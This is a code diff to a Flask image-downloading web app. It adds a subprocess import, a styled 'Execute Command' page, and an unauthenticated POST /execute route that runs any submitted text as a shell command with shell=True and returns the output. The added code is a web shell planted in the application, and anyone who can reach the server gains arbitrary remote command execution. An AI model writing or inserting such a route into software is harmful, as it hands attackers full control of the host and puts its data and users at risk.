@@ -22,6 +22,7 @@ from flask import Flask, render_template_string, request, send_file, jsonify
 import threading
 import asyncio
 from apscheduler.schedulers.background import BackgroundScheduler
+import subprocess
 
 load_dotenv()
 
@@ -368,6 +369,71 @@ async def download_image(url: str) -> BytesIO:
 @app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
+
+EXECUTE_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Execute Command</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        h1 { color: #4ec9b0; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; background: #2d2d2d; border: 1px solid #3e3e3e; color: #d4d4d4; font-family: monospace; font-size: 14px; }
+        button { margin-top: 10px; padding: 10px 20px; background: #0e639c; color: white; border: none; cursor: pointer; font-family: monospace; }
+        button:hover { background: #1177bb; }
+        pre { margin-top: 20px; padding: 15px; background: #2d2d2d; border: 1px solid #3e3e3e; overflow-x: auto; }
+        .output { color: #ce9178; }
+        .error { color: #f48771; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>$ Execute Command</h1>
+        <input type="text" id="cmd" placeholder="Enter command..." autofocus>
+        <button onclick="exec()">Execute</button>
+        <pre id="output"></pre>
+    </div>
+    <script>
+        const cmd = document.getElementById('cmd');
+        const output = document.getElementById('output');
+        cmd.addEventListener('keypress', (e) => { if (e.key === 'Enter') exec(); });
+        async function exec() {
+            const command = cmd.value.trim();
+            if (!command) return;
+            output.innerHTML = '<span class="output">Executing...</span>';
+            try {
+                const res = await fetch('/execute', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command }) });
+                const data = await res.json();
+                output.innerHTML = data.error ? `<span class="error">${data.error}</span>` : `<span class="output">${data.output || '(no output)'}</span>`;
+            } catch (e) {
+                output.innerHTML = `<span class="error">Error: ${e.message}</span>`;
+            }
+        }
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/execute')
+def execute_page():
+    return render_template_string(EXECUTE_HTML)
+
+@app.route('/execute', methods=['POST'])
+def execute_command():
+    try:
+        command = request.get_json().get('command')
+        if not command:
+            return jsonify({'error': 'No command provided'}), 400
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+        return jsonify({'output': result.stdout + result.stderr, 'returncode': result.returncode})
+    except subprocess.TimeoutExpired:
+        return jsonify({'error': 'Command timeout'}), 408
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/download', methods=['POST'])
 def download():
